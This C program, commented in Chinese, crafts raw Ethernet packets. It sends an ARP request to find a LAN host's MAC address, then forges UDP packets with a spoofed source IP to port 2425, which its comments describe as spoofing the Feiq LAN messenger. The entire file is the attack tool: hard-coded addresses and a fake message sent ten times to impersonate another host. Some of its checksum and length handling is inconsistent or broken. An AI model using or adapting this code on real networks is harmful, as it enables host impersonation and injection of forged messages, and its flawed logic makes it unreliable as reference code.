#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <net/if.h>//struct ifreq
#include <sys/ioctl.h> //ioctl、SIOCGIFADDR
#include <sys/socket.h>
#include <netinet/ether.h>//ETH_P_ALL
#include <netpacket/packet.h> //struct sockaddr_ll
#include <pthread.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <unistd.h>  

unsigned short checksum(unsigned short *buf, int nword)
{	
	unsigned long sum;
	for(sum = 0; nword > 0; nword--)
	{
		sum += htons(*buf);
		buf++;
	}
	sum = (sum>>16) + (sum&0xffff);
	sum += (sum>>16);
	return ~sum;
}  

int main()
{
	int sockfd;
	sockfd=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	if(sockfd<0)
	{
		perror("sockfd");
	}  
	//1.根据各种协议首部格式构建发送数据报
	unsigned char send_buf_mac[42]={
	//组MAC		
	0xff,0xff,0xff,0xff,0xff,0xff,// dest_mac
	0x00,0x0c,0x29,0x55,0x9e,0xfb,// src_mac
	0x08,0x06,// type
	//组ARP
	0x00,0x01,0x08,0x00,//硬件类型1(以太网地址),协议类型
	0x06,0x04,0x00,0x01,//硬件、协议地址分别是6、4，op:
						//(1：arp请求，2：arp应答)
	0x34,0x97,0xf6,0xc0,0x41,0xb9,//发送端的MAC地址
	10,20,155,18,//发送端的IP地址 
	0,0,0,0,0,0,//目的MAC地址
	10,20,155,3,//目的IP地址
	};
	//2.数据初始化
	struct sockaddr_ll sll;//原始套接字地址结构
	struct ifreq ethreq;//网络接口地址
	strncpy(ethreq.ifr_name,"ens33",IFNAMSIZ);//指定网卡名称
	//3.获取指定网卡对应的接口地址索引
	ioctl(sockfd,SIOCGIFINDEX,&ethreq);
	bzero(&sll,sizeof(sll));
	sll.sll_ifindex = ethreq.ifr_ifindex;
	bzero(&ethreq,sizeof(ethreq));
	sendto(sockfd,send_buf_mac,42,0,(struct sockaddr*)&sll, sizeof(sll));
	unsigned char recv_buf[42];
	recvfrom(sockfd,recv_buf,42,0,NULL,NULL);   	
	//发送飞秋欺骗包
	unsigned char buf[400]="1:123:heihei:heihei:32:heiheihei";
	unsigned  int length=strlen(buf);
	if(length%2+1 == 0)
	{
		length++;
	}
	printf("%02x:%02x:%02x:%02x:%02x:%02x:",
			recv_buf[22],recv_buf[23],recv_buf[24],recv_buf[25],recv_buf[26],recv_buf[27]);
	unsigned char buf_mac[14]=
	{
		//dst_mac
		recv_buf[22],recv_buf[23],recv_buf[24],recv_buf[25],recv_buf[26],recv_buf[27],
		//src_mac
		0xD6,0x89,0xDC,0xFB,0xF8,0x72,
		//type
		0x08,0x00  
	};
	unsigned char buf_ip[20]=
	{ 
		0x45,0x00,//版本
		0x00,0x00,//总长度
		0x00,0x00,//数据包编号	
		0x00,0x00,//偏移
		128,//生存时间
		17,//协议类型	
		0x00,0x00,//头部校验和
		10,20,155,17,//源IP地址
		10,20,155,3,//目的IP地址
	};
	unsigned char Real_udp[18]=
	{	
		0x09,0x79,//源端口号
		0x09,0x79,//目的端口号	
		0x00,0x00,//UDP数据长度  	
		0x00,0x00//UDP校验和
	};
	unsigned char fake_udp[1024]=
	{		
		10,20,155,17,//源IP地址		
		10,20,155,3,//目的IP地址	
		0x00,17,//协议
		0x00,0x00,//UDP数据长度	
		0x09,0x79,//源端口号	
		0x09,0x79,//目的端口号	
		0x00,0x28,//UDP数据长度	
		0x00,0x00//UDP校验和
	};
	unsigned short int len_ip=htons(28+length);
	unsigned short int len_udp=htons(8+length);
	*(unsigned short int *)(Real_udp+4) = len_udp;
	*(unsigned short int *)(buf_ip+2) = len_ip;
	*(unsigned short int *)(fake_udp+10) = len_udp;
	*(unsigned short int *)(fake_udp+16) = len_udp;
	unsigned short num_ip =htons(checksum((unsigned short *)buf_ip,10));
	memcpy(fake_udp+20,buf,length);
	unsigned short num_udp =htons(checksum((unsigned short *)fake_udp,(length+20)/2));
	*(unsigned short int *)(Real_udp+6) = num_udp;
	*(unsigned short int *)(buf_ip+10) = num_ip;
	unsigned char buf_send[200]="";
	memcpy(buf_send,buf_mac,14);
	memcpy(buf_send+14,buf_ip,20);
	memcpy(buf_send+34,Real_udp,8);
	memcpy(buf_send+42,buf,length);
	for (int i = 0; i < 10; ++i)
	{
		sendto(sockfd,buf_send,sizeof(buf_send),0,(struct sockaddr *)&sll,sizeof(sll));
	}
	return 0;
}
